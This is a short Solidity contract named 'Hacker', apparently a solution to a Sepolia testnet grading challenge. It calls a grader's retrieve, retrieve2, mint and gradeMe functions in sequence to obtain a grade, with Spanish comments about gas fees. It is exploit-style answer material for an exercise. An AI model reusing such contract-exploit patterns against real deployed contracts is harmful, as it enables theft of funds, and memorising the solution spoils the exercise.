// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGrader {
    function retrieve() external payable;
    function retrieve2() external payable;
    function mint(address to) external;
    function gradeMe(string calldata name) external;
    function balanceOf(address owner) external view returns (uint256);
}

contract Hacker {
    IGrader public grader;

    constructor(address _graderAddress) {
        grader = IGrader(_graderAddress);
    }

    function exploit(string calldata name) public payable {
        // ***CRUCIAL: Ajustar este valor según las tarifas de gas estimadas en Sepolia***
        // Obtener la estimación de gas de Remix, Hardhat, etc. y añadir un margen.
        // Ejemplo: Si la estimación es 0.0005 ETH, usar 0.0006 ETH.
        require(msg.value > 0.0006 ether, "Not enough ether for gas");

        // Envía *más de* 3 wei
        grader.retrieve{value: 4}();
        grader.retrieve2{value: 4}();

        grader.mint(msg.sender);
        require(grader.balanceOf(msg.sender) == 1, "Mint failed");
        grader.gradeMe(name);
    }
}